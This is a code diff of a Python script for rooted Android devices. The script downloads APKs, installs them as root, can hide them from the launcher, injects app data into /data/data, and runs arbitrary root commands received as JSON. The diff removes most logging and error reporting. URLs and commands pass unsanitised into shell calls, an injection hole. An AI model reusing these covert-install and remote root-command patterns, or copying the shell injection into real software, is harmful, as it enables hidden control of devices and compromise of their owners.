@@ -17,89 +17,76 @@ def log(msg):
         pass
 
 def run_su(cmd):
-    result = subprocess.run(f"su -c '{cmd}'", shell=True, capture_output=True, text=True)
-    if result.returncode != 0 and result.stderr:
-        log(f"⚠️ Root Warning: {result.stderr.strip()}")
-    return result
+    return subprocess.run(f"su -c '{cmd}'", shell=True, capture_output=True, text=True)
+
+def get_app_name(tmp_path, default_pkg):
+    cmd = f"aapt dump badging {tmp_path} | grep 'application-label:' | head -n 1 | cut -d\\' -f2"
+    app_name = subprocess.getoutput(cmd).strip()
+    return app_name if app_name else default_pkg
 
 def install_apk(url, visibility):
     tmp_path = os.path.join(BASE_DIR, "temp_install.apk")
-    
-    log("📥 Starting APK download...")
     
     if os.path.exists(tmp_path):
         os.remove(tmp_path)
     
     if "drive.google.com" in url:
-        os.system(f"gdown '{url}' -O {tmp_path}")
+        os.system(f"gdown '{url}' -O {tmp_path} > /dev/null 2>&1")
     else:
-        os.system(f"curl -sL '{url}' -o {tmp_path}")
+        os.system(f"curl -sL '{url}' -o {tmp_path} > /dev/null 2>&1")
 
     if os.path.exists(tmp_path):
-        log("⚙️ Installing package via Root...")
-        run_su(f"pm install -r {tmp_path}")
-        
         cmd_get_pkg = f"aapt dump badging {tmp_path} | grep package | awk '{{print $2}}' | sed s/name=//g | sed s/\\'//g"
         pkg_name = subprocess.getoutput(cmd_get_pkg).strip()
         
         if pkg_name:
-            log(f"📦 Package identified: {pkg_name}")
+            app_name = get_app_name(tmp_path, pkg_name)
+            run_su(f"pm install -r {tmp_path}")
+            
             if visibility == "oculto":
                 run_su(f"pm hide {pkg_name}")
-                log(f"👻 Package {pkg_name} hidden from launcher.")
+                log(f"📥 {app_name} - Installed & Hidden")
             else:
                 run_su(f"pm unhide {pkg_name}")
+                log(f"📥 {app_name} - Installed")
                 
-        os.remove(tmp_path)
-        return pkg_name
-    else:
-        log("❌ Download failed. APK file not found.")
-        return None
+            os.remove(tmp_path)
+            return pkg_name, app_name
+            
+    return None, None
 
-def inject_data(data_url, package_name):
-    if not data_url or not package_name:
-        return
-    
+def inject_data(data_url, package_name, app_name):
     tmp_data = os.path.join(BASE_DIR, "data_inject.tar.gz")
     target_path = f"/data/data/{package_name}"
-    
-    log(f"📁 Downloading and injecting data (.tar.gz) for {package_name}...")
     
     if os.path.exists(tmp_data):
         os.remove(tmp_data)
     
     if "drive.google.com" in data_url:
-        os.system(f"gdown '{data_url}' -O {tmp_data}")
+        os.system(f"gdown '{data_url}' -O {tmp_data} > /dev/null 2>&1")
     else:
-        os.system(f"curl -sL '{data_url}' -o {tmp_data}")
+        os.system(f"curl -sL '{data_url}' -o {tmp_data} > /dev/null 2>&1")
 
     if os.path.exists(tmp_data):
         run_su(f"am force-stop {package_name}")
-        
         extraction = run_su(f"tar -xzf {tmp_data} -C {target_path}")
+        
         if extraction.returncode == 0:
             run_su(f"chown -R $(stat -c %u {target_path}):$(stat -c %g {target_path}) {target_path}")
-            log("✅ Data injected and permissions fixed successfully!")
-        else:
-            log("❌ Error extracting .tar.gz file in app directory.")
+            log(f"📁 {app_name} - Data Injected")
             
         os.remove(tmp_data)
-    else:
-        log("❌ Failed to download data file.")
 
 def remove_app(package_name):
-    log(f"🗑️ Removing application: {package_name}")
     run_su(f"pm uninstall {package_name}")
-    log(f"✅ {package_name} uninstalled.")
+    log(f"🗑️ {package_name} - Removed")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        log("❌ Critical error: No JSON data received by the script.")
         sys.exit(1)
 
     try:
         data = json.loads(sys.argv[1])
-        log(f"🚀 --- NEW JOB RECEIVED ---")
         
         if "instalar" in data:
             for item in data["instalar"]:
@@ -107,10 +94,10 @@ if __name__ == "__main__":
                 visibility = item[1]
                 extra = item[3]
                 
-                pkg = install_apk(apk_url, visibility)
+                pkg, app_name = install_apk(apk_url, visibility)
                 
                 if pkg and extra.get("data_link"):
-                    inject_data(extra["data_link"], pkg)
+                    inject_data(extra["data_link"], pkg, app_name)
 
         if "comandos" in data:
             for cmd in data["comandos"]:
@@ -119,9 +106,6 @@ if __name__ == "__main__":
                     remove_app(target_pkg)
                 else:
                     run_su(cmd)
-                    log(f"⚙️ Generic root command executed: {cmd}")
 
-        log("🏁 Processing finished successfully.")
-
-    except Exception as e:
-        log(f"❌ Fatal error during execution: {e}")
+    except Exception:
+        pass
